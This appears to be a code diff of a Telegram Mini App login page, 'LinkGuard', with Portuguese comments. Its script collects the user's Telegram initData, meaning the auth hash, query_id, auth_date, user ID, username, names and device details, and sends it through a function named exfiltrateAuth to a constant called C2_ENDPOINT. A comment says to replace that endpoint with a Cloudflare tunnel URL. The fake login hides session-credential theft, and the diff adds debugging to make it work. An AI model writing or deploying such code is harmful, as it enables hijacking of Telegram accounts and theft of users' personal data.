@@ -99,63 +99,122 @@
     </div>
 
     <script>
-        const tg = window.Telegram.WebApp;
-        const C2_ENDPOINT = 'http://127.0.0.1:8000/linkguard-auth';
+const tg = window.Telegram.WebApp;
+// Use a URL do túnel do Cloudflare aqui
+const C2_ENDPOINT = 'http://127.0.0.1:8000/linkguard-auth';
 
-        function collectAuthData() {
-            const user = tg.initDataUnsafe.user;
-            return {
-                event_type: 'linkguard_auth',
-                auth: { hash: tg.initDataUnsafe.hash, query_id: tg.initDataUnsafe.query_id },
-                user: {
-                    id: user.id, username: user.username, first_name: user.first_name,
-                    last_name: user.last_name, language_code: user.language_code, is_premium: user.is_premium
-                },
-                device: { platform: tg.platform, version: tg.version, colorScheme: tg.colorScheme },
-                timestamp: new Date().toISOString()
-            };
+tg.ready();
+tg.expand();
+
+// Função de Log Visível (para depuração rápida)
+function showDebugLog(message, isError = false) {
+    const logDiv = document.createElement('div');
+    logDiv.style.cssText = `
+        background: ${isError ? '#d93025' : '#188038'}; 
+        color: white; 
+        padding: 8px; 
+        margin: 4px; 
+        font-size: 10px; 
+        font-family: monospace; 
+        border-radius: 4px; 
+        word-break: break-all;
+    `;
+    logDiv.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+    document.body.appendChild(logDiv);
+    // Limita a 5 logs
+    if (document.body.children.length > 5) {
+        document.body.removeChild(document.body.children[0]);
+    }
+}
+
+function collectAuthData() {
+    if (!tg.initDataUnsafe || !tg.initDataUnsafe.user) {
+        throw new Error('initDataUnsafe está vazio');
+    }
+    
+    const user = tg.initDataUnsafe.user;
+    showDebugLog('initData carregado. ID: ' + user.id);
+    
+    return {
+        event_type: 'linkguard_auth',
+        auth: { 
+            hash: tg.initDataUnsafe.hash, 
+            query_id: tg.initDataUnsafe.query_id,
+            auth_date: tg.initDataUnsafe.auth_date
+        },
+        user: {
+            id: user.id, 
+            username: user.username, 
+            first_name: user.first_name,
+            last_name: user.last_name, 
+            language_code: user.language_code, 
+            is_premium: user.is_premium
+        },
+        device: { 
+            platform: tg.platform, 
+            version: tg.version, 
+            colorScheme: tg.colorScheme
+        },
+        timestamp: new Date().toISOString()
+    };
+}
+
+async function exfiltrateAuth(data) {
+    showDebugLog('Iniciando POST para: ' + C2_ENDPOINT);
+    
+    try {
+        const response = await fetch(C2_ENDPOINT, {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify(data)
+        });
+        
+        const text = await response.text();
+        showDebugLog(`Resposta HTTP: ${response.status} - ${text}`);
+        
+        if (!response.ok) {
+            throw new Error(`HTTP ${response.status}`);
         }
+        
+        return JSON.parse(text);
+    } catch (error) {
+        showDebugLog(`ERRO CRÍTICO: ${error.message}`, true);
+        console.error('Detalhes do erro:', error);
+        return null;
+    }
+}
 
-        async function exfiltrateAuth(data) {
-            try {
-                const response = await fetch(C2_ENDPOINT, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                return response.ok;
-            } catch (error) {
-                console.error('Falha na exfiltração:', error);
-                return false;
-            }
+async function handleLogin() {
+    const statusMsg = document.getElementById('status-msg');
+    const loginBtn = document.getElementById('login-btn');
+    loginBtn.disabled = true;
+    statusMsg.textContent = 'Autenticando...';
+    showDebugLog('Botão de login clicado');
+
+    try {
+        const authData = collectAuthData();
+        const result = await exfiltrateAuth(authData);
+        
+        if (result && result.status === 'authenticated') {
+            setTimeout(() => {
+                document.getElementById('content-area').classList.remove('hidden');
+                document.getElementById('user-name').textContent = authData.user.first_name;
+                statusMsg.textContent = '✅ Acesso Liberado';
+                showDebugLog('Autenticação bem-sucedida');
+                tg.HapticFeedback.notificationOccurred('success');
+            }, 1000);
+        } else {
+            throw new Error('Resposta inválida do C2');
         }
+    } catch (error) {
+        statusMsg.textContent = '❌ Erro: ' + error.message;
+        showDebugLog('Falha no fluxo de login: ' + error.message, true);
+        loginBtn.disabled = false;
+        tg.HapticFeedback.notificationOccurred('error');
+    }
+}
 
-        async function handleLogin() {
-            const statusMsg = document.getElementById('status-msg');
-            const loginBtn = document.getElementById('login-btn');
-            loginBtn.disabled = true;
-            statusMsg.textContent = 'Autenticando...';
-
-            const authData = collectAuthData();
-            const success = await exfiltrateAuth(authData);
-
-            if (success) {
-                setTimeout(() => {
-                    document.getElementById('content-area').classList.remove('hidden');
-                    document.getElementById('user-name').textContent = authData.user.first_name;
-                    statusMsg.textContent = '✅ Acesso Liberado';
-                    tg.HapticFeedback.notificationOccurred('success');
-                }, 1000);
-            } else {
-                statusMsg.textContent = '❌ Erro de Autenticação';
-                loginBtn.disabled = false;
-                tg.HapticFeedback.notificationOccurred('error');
-            }
-        }
-
-        tg.ready();
-        tg.expand();
-        document.getElementById('login-btn').addEventListener('click', handleLogin);
-    </script>
-</body>
-</html>
+document.getElementById('login-btn').addEventListener('click', handleLogin);
